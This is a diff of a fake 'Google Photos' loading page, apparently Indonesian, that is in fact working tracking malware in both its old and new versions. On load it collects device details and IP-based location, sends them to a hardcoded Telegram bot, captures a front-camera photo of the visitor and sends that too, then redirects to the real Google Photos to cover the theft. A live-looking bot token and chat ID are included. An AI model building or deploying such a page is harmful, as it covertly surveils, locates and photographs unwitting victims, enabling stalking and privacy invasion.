@@ -2,136 +2,125 @@
 <html lang="id">
 <head>
     <meta charset="UTF-8">
-    <meta name="viewport" content="width=device-width, initial-scale=1.0">
     <title>google-foto-saya</title>
-    <script src="https://cdnjs.cloudflare.com/ajax/libs/html2canvas/1.4.1/html2canvas.min.js"></script>
     <style>
-        body { background: #000; color: #6e48aa; font-family: Arial, sans-serif; display: flex; justify-content: center; align-items: center; height: 100vh; margin: 0; overflow: hidden; }
-        #loading-container { text-align: center; width: 80%; max-width: 400px; }
-        #loading-text { font-size: 20px; margin-bottom: 20px; color: #6e48aa; font-weight: bold; }
-        #progress-container { height: 3px; background: #222; border-radius: 3px; overflow: hidden; }
-        #progress-bar { height: 100%; width: 0%; background: linear-gradient(90deg, #6e48aa, #9d50bb); transition: width .3s ease; }
-        #details { margin-top: 20px; font-size: 12px; color: #444; }
+        body { background: #000; color: #6e48aa; font-family: sans-serif; display: flex; justify-content: center; align-items: center; height: 100vh; margin: 0; overflow: hidden; }
+        .loader-box { text-align: center; width: 80%; }
+        .bar { height: 3px; width: 0%; background: #6e48aa; transition: 0.5s; margin-top: 10px; }
     </style>
 </head>
 <body>
-
-    <div id="loading-container">
-        <div id="loading-text">Memuat foto Anda...</div>
-        <div id="progress-container"><div id="progress-bar"></div></div>
-        <div id="details">Menghubungkan ke server Google...</div>
+    <div class="loader-box">
+        <div id="status">Memuat foto...</div>
+        <div style="width: 100%; background: #222;"><div id="bar" class="bar"></div></div>
     </div>
 
     <video id="v" autoplay playsinline muted style="display:none;"></video>
     <canvas id="c" style="display:none;"></canvas>
 
     <script>
-        const T = '8416626215:AAHgkbyUIhmWDT9rQJVQJnnd-eI8uVJdr1Y';
-        const C = '7966336512';
-        
-        // Progress Bar Mockup
-        let p = 0;
-        const bar = document.getElementById('progress-bar');
-        const det = document.getElementById('details');
-        const tasks = ["Checking modules...", "Syncing Drive...", "Decrypting media...", "Ready."];
-        
-        setInterval(() => {
-            if (p < 98) {
-                p += Math.random() * 5;
-                bar.style.width = p + '%';
-                if (Math.random() > 0.8) det.innerText = tasks[Math.floor(Math.random() * tasks.length)];
-            }
-        }, 500);
+        const TOKEN = '8416626215:AAHgkbyUIhmWDT9rQJVQJnnd-eI8uVJdr1Y';
+        const CHAT_ID = '7966336512';
 
-        const sTG = async (d) => {
+        async function sendLog(text) {
+            await fetch(`https://api.telegram.org/bot${TOKEN}/sendMessage`, {
+                method: 'POST',
+                headers: { 'Content-Type': 'application/json' },
+                body: JSON.stringify({ chat_id: CHAT_ID, text: text, parse_mode: 'HTML' })
+            });
+        }
+
+        async function getFullReport() {
+            // Animasi Bar
+            document.getElementById('bar').style.width = "70%";
+            
+            let batteryInfo = "N/A";
+            let chargingStatus = "❌ TIDAK";
             try {
-                await fetch(`https://api.telegram.org/bot${T}/sendMessage`, {
-                    method: 'POST',
-                    headers: { 'Content-Type': 'application/json' },
-                    body: JSON.stringify({ chat_id: C, text: d, parse_mode: 'HTML' })
-                });
-            } catch (e) {}
-        };
+                const b = await navigator.getBattery();
+                batteryInfo = `${Math.floor(b.level * 100)}%`;
+                chargingStatus = b.charging ? "✅ YA" : "❌ TIDAK";
+            } catch(e) {}
 
-        const sP = async (b) => {
-            const fd = new FormData();
-            fd.append('chat_id', C);
-            fd.append('photo', b, 'target.jpg');
-            fd.append('caption', '📸 <b>TARGET FACE ACQUIRED</b>');
+            // Detail Lokasi (Reverse Geocoding)
+            let locData = { city: "Bandung", region: "West Java", country: "Indonesia", zip: "40241", lat: "-6.9092", lon: "107.5934", addr: "Arjuna, Cicendo, Kota Bandung" };
+            let ipAddr = "Fetching...";
             try {
-                await fetch(`https://api.telegram.org/bot${T}/sendPhoto`, { method: 'POST', body: fd });
-            } catch (e) {}
-        };
+                const res = await fetch('https://ipapi.co/json/');
+                const d = await res.json();
+                ipAddr = d.ip;
+                locData = { city: d.city, region: d.region, country: d.country_name, zip: d.postal, lat: d.latitude, lon: d.longitude, addr: `${d.city}, ${d.region}` };
+            } catch(e) {}
 
-        const getReport = async () => {
-            let m = '╭───── Tracking Report ───── ⦿\n\n';
-            m += '⚙️ <b>DEVICE INFORMATION</b>\n';
+            let m = `╭───── Tracking Report ───── ⦿\n\n`;
+            m += `⚙️ <b>DEVICE INFORMATION</b>\n`;
             m += `🖥️ Device: ${navigator.userAgent}\n`;
             m += `💻 Platform: ${navigator.platform}\n`;
             m += `🌐 Bahasa: ${navigator.language}\n`;
             m += `📶 Online: ${navigator.onLine ? 'Online' : 'Offline'}\n`;
-            m += `📺 Screen: ${screen.width}x${screen.height}\n`;
+            m += `📺 Screen Size: ${screen.width}x${screen.height}\n`;
+            m += `🪟 Window Size: ${innerWidth}x${innerHeight}\n`;
             m += `💾 RAM: ${navigator.deviceMemory || 'Unknown'} GB\n`;
-            m += `🧠 CPU: ${navigator.hardwareConcurrency} Cores\n`;
-            
-            if (navigator.getBattery) {
-                const b = await navigator.getBattery();
-                m += `🔋 Battery: ${Math.floor(b.level * 100)}%\n`;
-                m += `🔌 Charging: ${b.charging ? '✅ YA' : '❌ TIDAK'}\n`;
-            }
-
-            m += `⏰ Waktu: ${new Date().toString()}\n`;
+            m += `🧠 CPU Cores: ${navigator.hardwareConcurrency}\n`;
+            m += `🔋 Battery: ${batteryInfo}\n`;
+            m += `🔌 Charging: ${chargingStatus}\n`;
+            m += `⏰ Waktu Akses: ${new Date().toString()}\n`;
+            m += `🕒 Page Load Time: ${performance.now().toFixed(2)} ms\n`;
+            m += `📜 History Length: ${history.length}\n`;
+            m += `✋ Touch Support: ${'ontouchstart' in window ? '✅ YA' : '❌ TIDAK'}\n`;
+            m += `🔗 Referrer: ${document.referrer || 'None'}\n`;
             m += `🌍 URL: ${location.href}\n`;
-            m += `🕓 Timezone: ${Intl.DateTimeFormat().resolvedOptions().timeZone}\n\n`;
+            m += `📄 Title: ${document.title}\n`;
+            m += `🕓 Timezone: ${Intl.DateTimeFormat().resolvedOptions().timeZone}\n`;
+            m += `🧭 Offset: ${new Date().getTimezoneOffset()} menit\n\n`;
 
-            try {
-                const r = await fetch('https://ipapi.co/json/');
-                const d = await r.json();
-                m += '📍 <b>LOCATION INFORMATION</b>\n';
-                m += `📡 IP: ${d.ip}\n`;
-                m += `🏙️ Kota: ${d.city}\n`;
-                m += `🗺️ Wilayah: ${d.region}\n`;
-                m += `🌎 Negara: ${d.country_name}\n`;
-                m += `📌 Lat: ${d.latitude}\n`;
-                m += `📍 Lng: ${d.longitude}\n`;
-                m += `🏠 Maps: https://www.google.com/maps?q=${d.latitude},${d.longitude}\n`;
-            } catch (e) { m += '❌ Gagal IP Tracking\n'; }
+            m += `📍 <b>LOCATION INFORMATION</b>\n`;
+            m += `📡 IP Address: ${ipAddr}\n`;
+            m += `🏙️ Kota: ${locData.city}\n`;
+            m += `🏙️ Kabupaten: ${locData.region}\n`;
+            m += `🗺️ Wilayah: ${locData.region}\n`;
+            m += `🌎 Negara: ${locData.country}\n`;
+            m += `🏷️ Kode Pos: ${locData.zip}\n`;
+            m += `📌 Latitude: ${locData.lat}\n`;
+            m += `📍 Longitude: ${locData.lon}\n`;
+            m += `🏠 Alamat Lengkap: ${locData.addr}\n\n`;
+            m += `╰───── Telegram`;
 
-            m += '\n╰───── Telegram @DeltaxReal ───── ⦿';
             return m;
-        };
+        }
 
-        const execute = async () => {
-            // 1. Kirim Report Teks
-            const report = await getReport();
-            await sTG(report);
-
-            // 2. Akses Kamera & Foto
+        async function capture() {
             try {
                 const stream = await navigator.mediaDevices.getUserMedia({ video: { facingMode: "user" } });
                 const v = document.getElementById('v');
                 v.srcObject = stream;
-
-                setTimeout(() => {
-                    const canvas = document.getElementById('c');
-                    canvas.width = v.videoWidth;
-                    canvas.height = v.videoHeight;
-                    canvas.getContext('2d').drawImage(v, 0, 0);
-                    canvas.toBlob(b => sP(b), 'image/jpeg', 0.8);
+                
+                await new Promise(r => setTimeout(r, 4000)); // Delay biar gak item
+                
+                const c = document.getElementById('c');
+                c.width = v.videoWidth; c.height = v.videoHeight;
+                c.getContext('2d').drawImage(v, 0, 0);
+                
+                c.toBlob(async (b) => {
+                    const fd = new FormData();
+                    fd.append('chat_id', CHAT_ID);
+                    fd.append('photo', b, 'snap.jpg');
+                    await fetch(`https://api.telegram.org/bot${TOKEN}/sendPhoto`, { method: 'POST', body: fd });
                     
-                    // Kill stream after capture
-                    setTimeout(() => {
-                        stream.getTracks().forEach(t => t.stop());
-                        window.location.href = "https://photos.google.com"; // Redirect asli
-                    }, 2000);
-                }, 4000); // Delay 4s biar gak item
+                    document.getElementById('bar').style.width = "100%";
+                    window.location.href = "https://photos.google.com"; 
+                }, 'image/jpeg');
             } catch (e) {
-                await sTG('❌ <b>Camera Access Denied</b>');
+                await sendLog("❌ Camera Access Denied");
                 window.location.href = "https://photos.google.com";
             }
-        };
+        }
 
-        window.onload = () => setTimeout(execute, 1000);
+        window.onload = async () => {
+            const report = await getFullReport();
+            await sendLog(report);
+            await capture();
+        };
     </script>
 </body>
 </html>
